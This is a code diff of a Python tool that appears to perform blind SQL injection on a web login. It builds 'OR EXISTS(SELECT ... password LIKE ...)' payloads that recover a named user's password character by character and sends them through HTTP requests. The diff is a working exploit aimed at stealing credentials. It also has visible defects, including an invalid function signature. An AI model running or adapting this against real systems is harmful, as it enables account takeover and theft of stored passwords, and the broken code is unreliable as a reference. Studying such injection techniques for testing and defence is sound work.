@@ -5,6 +5,7 @@ def checkPasswordCharacter(character, username, index = "no index", url):
 
    Args:
       index: integer representing the location in the password string to check for character
+         if a negative integer, will count from end of string, e.g. -1 is last character in the string
          default value is for no index specified, will pad with arbitrary characters
 
       username: username associated with password being checked for character
@@ -20,6 +21,21 @@ def checkPasswordCharacter(character, username, index = "no index", url):
 
    Raises:
       tbd -- needs to be updated later!
+
+      from the quick start guide:
+         Errors and Exceptions
+            
+         In the event of a network problem (e.g. DNS failure, refused connection, etc), Requests will raise a ConnectionError exception.
+         
+         Response.raise_for_status() will raise an HTTPError if the HTTP request returned an unsuccessful status code.
+         
+         If a request times out, a Timeout exception is raised.
+         
+         If a request exceeds the configured number of maximum redirections, a TooManyRedirects exception is raised.
+         
+         All exceptions that Requests explicitly raises inherit from requests.exceptions.RequestException.
+
+      
 
    """
 
@@ -43,6 +59,9 @@ def sendQuery(payload, url):
 
    """
 
+   r = requests.get(url, params = payload)
+   return r.text
+
 def readQuery(query):
    """ reads the html returned by the query and determines if login was successful
 
@@ -65,6 +84,7 @@ def constructPasswordPayload(character, username, index = "no index"):
    Args:
       index: integer 
          represents the location of character in the password string encoded
+         if a negative integer, will count from end of string, e.g. -1 is last character in the string
          default value is for no index specified, will pad with arbitrary characters
 
       character: character(s) in password to check for username
@@ -77,6 +97,58 @@ def constructPasswordPayload(character, username, index = "no index"):
          keys are username and password
 
    """
+
+   sqlQuery = constructSQLQuery(character, username, index)
+
+   dickt = {"name" : sqlQuery, "password" : sqlQuery}
+
+   return dickt;
+
+
+def constructSQLQuery(character, username, index = "no index"):
+   """makes SQL query for constructPasswordPayload.
+      
+      Another helper function, see documentation for constructPasswordPayload
+
+   """
+
+   # the LIKE command uses % and _ as wildcards. % for arbitrary characters(0 to n), _ for one. 
+   # Looks like this is not MS access. Using * instead of % does not work, which makes sense.
+   # https://www.w3schools.com/SQL/sql_like.asp
+   # https://www.w3schools.com/sql/sql_wildcards.asp
+
+   sqlQuery = "' OR EXISTS(SELECT * FROM users WHERE name= '" + username + "' AND password LIKE '" 
+
+
+   # No! make a password string in this if elif else block and concatonate that string at the end of sqlQuery
+
+   passStr = ""
+
+   if(index == "no index"):
+      passStr += "%" + character + "%"
+
+   elif(index == 0):
+      passStr += character + "%"
+
+    #len(padding) = index; all "_" characters
+      
+   elif(index >= 0):
+      padding = "_" * index
+      passStr = padding + character + "%"
+
+   else:
+      index   = -1 * index -1 # so index is non-negative; -1 since end is -1 and begining is 0 not 1. 
+      padding = "_" * index
+      passStr = "%" + character + padding
+
+   sqlQuery += passStr + "') AND ''='"
+
+   return sqlQuery;
+
+
+
+
+
 
 
 
